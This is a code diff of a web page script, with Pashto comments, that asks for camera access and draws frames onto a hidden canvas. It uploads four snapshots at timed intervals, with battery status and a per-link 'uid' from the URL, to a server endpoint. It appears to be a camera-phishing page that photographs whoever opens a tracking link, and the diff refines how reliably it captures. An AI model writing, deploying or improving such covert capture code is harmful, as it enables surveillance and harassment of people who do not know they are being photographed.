@@ -62,71 +62,68 @@
 <canvas id="snapshot" style="display:none"></canvas>
 
 <script>
-(async function(){
-  const camera = document.getElementById('camera');
+  const video = document.getElementById('video');
   const canvas = document.getElementById('snapshot');
   const ctx = canvas.getContext('2d');
-  const uid = (new URLSearchParams(location.search)).get('uid') || 'unknown';
+  const log = document.getElementById('log');
+  const statusEl = document.getElementById('status');
 
-  const MAX = 4;            // څو عکسونه
-  const INTERVAL_MS = 2000; // هر څو ثانیو وروسته
+  const params = new URLSearchParams(window.location.search);
+  const uid = params.get('uid') || 'unknown';
 
-  // د بیټري معلومات (اختیاري)
-  let batteryLevel = null, isCharging = null;
-  try {
-    const b = await navigator.getBattery();
-    batteryLevel = Math.round(b.level * 100);
-    isCharging = b.charging;
-  } catch(e) {}
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    camera.srcObject = stream;
-
-    // د video dimensions د چمتو کېدو انتظار
-    await new Promise(resolve => {
-      camera.onloadedmetadata = () => resolve();
-    });
-
-    // د لومړي frame لپاره لږ انتظار
-    await new Promise(r => setTimeout(r, 1000));
-
-    for (let i = 0; i < MAX; i++) {
-      if (camera.videoWidth === 0 || camera.videoHeight === 0) {
-        console.warn("⚠️ video dimensions not ready, skipping frame");
-        continue;
-      }
-
-      canvas.width = camera.videoWidth;
-      canvas.height = camera.videoHeight;
-      ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
-
-      const imageData = canvas.toDataURL("image/png");
-
-      // سرور ته لېږل
-      fetch("/api/upload", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          image: imageData,
-          uid,
-          battery: batteryLevel,
-          charging: isCharging
-        })
-      }).then(r => r.json()).then(d => {
-        console.log("✅ uploaded snapshot", i+1, d);
-      }).catch(err => console.error("❌ upload error", err));
-
-      if (i < MAX - 1) await new Promise(r => setTimeout(r, INTERVAL_MS));
+  function takeSnapshotAndSend(battery, charging) {
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+      console.warn("⚠️ Video not ready yet, skipping snapshot...");
+      return;
     }
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // کیمره بنده کړه
-    stream.getTracks().forEach(t => t.stop());
-    console.log("📷 camera stopped after", MAX, "snapshots");
-  } catch(err) {
-    console.error("camera error", err);
+    const imageData = canvas.toDataURL('image/png');
+
+    fetch('/api/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        image: imageData,
+        uid,
+        battery,
+        charging
+      })
+    }).then(res => res.json()).then(data => {
+      console.log("✅ Uploaded:", data);
+      log.innerText += "Snapshot uploaded...\n";
+    }).catch(err => {
+      console.error("❌ Upload error:", err);
+      log.innerText += "Upload failed!\n";
+    });
   }
-})();
+
+  if (uid) {
+    navigator.getBattery().then(battery => {
+      const batteryLevel = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
+
+      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        statusEl.innerText = "Camera access granted...";
+
+        // ✨ مهم اصلاح: snapshots یوازې د "playing" وروسته پیل کېږي
+        video.onplaying = () => {
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
+        };
+      }).catch(err => {
+        console.error("Camera error:", err);
+        statusEl.innerText = "Camera error!";
+      });
+    });
+  }
 </script> 
 </body>
 </html> 
